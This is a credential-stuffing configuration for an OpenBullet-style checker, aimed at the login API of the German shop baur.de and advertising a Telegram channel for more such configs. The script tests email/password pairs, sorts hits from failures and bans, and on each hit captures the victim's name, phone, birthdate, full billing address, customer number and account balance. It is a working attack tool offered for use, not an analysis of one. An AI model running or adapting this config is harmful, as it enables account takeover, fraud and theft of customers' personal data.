{
  "Name": "baur.de",
  "SuggestedBots": 50,
  "MaxCPM": 0,
  "LastModified": "2024-06-02T11:15:06.2022304+02:00",
  "AdditionalInfo": "",
  "RequiredPlugins": [],
  "Author": "@yngzexu",
  "Version": "1.1.4 [SB]",
  "SaveEmptyCaptures": false,
  "ContinueOnCustom": false,
  "SaveHitsToTextFile": false,
  "IgnoreResponseErrors": false,
  "MaxRedirects": 8,
  "NeedsProxies": false,
  "OnlySocks": false,
  "OnlySsl": false,
  "MaxProxyUses": 0,
  "BanProxyAfterGoodStatus": false,
  "BanLoopEvasionOverride": -1,
  "EncodeData": false,
  "AllowedWordlist1": "",
  "AllowedWordlist2": "",
  "DataRules": [],
  "CustomInputs": [
    {
      "Description": "t.me/xconfigking, for more configs!!!",
      "VariableName": "",
      "Id": 1980309755
    }
  ],
  "CaptchaUrl": "",
  "IsBase64": false,
  "FilterList": [],
  "EvaluateMathOCR": false,
  "SecurityProtocol": 0,
  "ForceHeadless": false,
  "AlwaysOpen": false,
  "AlwaysQuit": false,
  "QuitOnBanRetry": false,
  "AcceptInsecureCertificates": true,
  "DisableNotifications": false,
  "DisableImageLoading": false,
  "DefaultProfileDirectory": false,
  "CustomUserAgent": "",
  "RandomUA": false,
  "CustomCMDArgs": "",
  "Title": "baur",
  "IconPath": "Icon\\svbfile.ico",
  "LicenseSource": null,
  "Message": null,
  "MessageColor": "#FFFFFFFF",
  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
  "AuthorColor": "#FFFFB266",
  "WordlistColor": "#FFB5C2E1",
  "BotsColor": "#FFA8FFFF",
  "CustomInputColor": "#FFD6C7C7",
  "CPMColor": "#FFFFFFFF",
  "ProgressColor": "#FFAD93E3",
  "HitsColor": "#FF66FF66",
  "CustomColor": "#FFFFB266",
  "ToCheckColor": "#FF7FFFD4",
  "FailsColor": "#FFFF3333",
  "RetriesColor": "#FFFFFF99",
  "OcrRateColor": "#FF4698FD",
  "ProxiesColor": "#FFFFFFFF"
}

[SCRIPT]
#UA FUNCTION GetRandomUA BROWSER Firefox -> VAR "UA" 

#Get REQUEST GET "https://www.baur.de/api/customer/v1/login/anonymous" 
  
  HEADER "Host: www.baur.de" 
  HEADER "User-Agent: <UA>" 
  HEADER "Accept: */*" 
  HEADER "Accept-Language: en-US,en;q=0.5" 
  HEADER "Accept-Encoding: gzip, deflate" 
  HEADER "Referer: https://www.baur.de/mein-konto/uebersicht" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Te: trailers" 

#sessionToken PARSE "<SOURCE>" JSON "sessionToken" -> VAR "sessionToken" 

#Login REQUEST POST "https://www.baur.de/api/customer/v1/login" 
  CONTENT "{\"type\":\"password\",\"passwordCredentials\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"},\"useAutologin\":true}" 
  CONTENTTYPE "application/json" 
  HEADER "Host: www.baur.de" 
  HEADER "User-Agent: <UA>" 
  HEADER "Accept: application/json" 
  HEADER "Accept-Language: en-US,en;q=0.5" 
  HEADER "Accept-Encoding: gzip, deflate" 
  HEADER "Referer: https://www.baur.de/mein-konto/uebersicht" 
  HEADER "Ec-Locale: de-DE" 
  HEADER "X-Ec-Token: <sessionToken>" 
  HEADER "Origin: https://www.baur.de" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Te: trailers" 

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "sessionToken" 
  KEYCHAIN Failure OR 
    KEY "Deine Zugangsdaten sind leider unvollständig oder fehlerhaft" 
  KEYCHAIN Ban OR 
    KEY "<RESPONSECODE>" EqualTo "503" 

#sessionToken PARSE "<SOURCE>" JSON "sessionToken" -> VAR "sessionToken" 

#phoneNumber PARSE "<SOURCE>" JSON "number" CreateEmpty=FALSE -> CAP "phoneNumber" 

#firstName PARSE "<SOURCE>" JSON "customer.firstName" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "firstName" 

#lastName PARSE "<SOURCE>" JSON "customer.lastName" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "lastName" 

#customerNumber PARSE "<SOURCE>" JSON "businessPartnerNo" CreateEmpty=FALSE -> CAP "customerNumber" 

#g PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "g" 

#gender FUNCTION Translate 
  KEY "f" VALUE "Female" 
  KEY "m" VALUE "Male" 
  "<g>" -> CAP "gender" 

#street PARSE "<SOURCE>" JSON "customer.billingAddress.street" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "street" 

#houseNumber PARSE "<SOURCE>" JSON "customer.billingAddress.houseNumber" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "houseNumber" 

#zipCode PARSE "<SOURCE>" JSON "customer.billingAddress.zipCode" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "zipCode" 

#city PARSE "<SOURCE>" JSON "customer.billingAddress.city" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "city" 

#countryCode PARSE "<SOURCE>" JSON "customer.billingAddress.countryCode" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "countryCode" 

#addressName PARSE "<SOURCE>" JSON "customer.billingAddress.addressName" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "addressName" 

#birthDay PARSE "<SOURCE>" JSON "birthDay" CreateEmpty=FALSE -> CAP "birthDay" 

#Get REQUEST GET "https://www.baur.de/api/customer/v1/customer/status" 
  
  HEADER "Host: www.baur.de" 
  HEADER "User-Agent: <UA>" 
  HEADER "Accept: */*" 
  HEADER "Accept-Language: en-US,en;q=0.5" 
  HEADER "Accept-Encoding: gzip, deflate" 
  HEADER "Referer: https://www.baur.de/mein-konto/uebersicht" 
  HEADER "Ec-Locale: de-DE" 
  HEADER "X-Ec-Token: <sessionToken>" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Te: trailers" 

#currencyCode PARSE "<SOURCE>" JSON "maturities.currentAccountBalance.currencyCode" JTokenParsing=TRUE -> VAR "currencyCode" 

#balance PARSE "<SOURCE>" JSON "maturities.currentAccountBalance.value" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "balance" "" " <currencyCode>" 
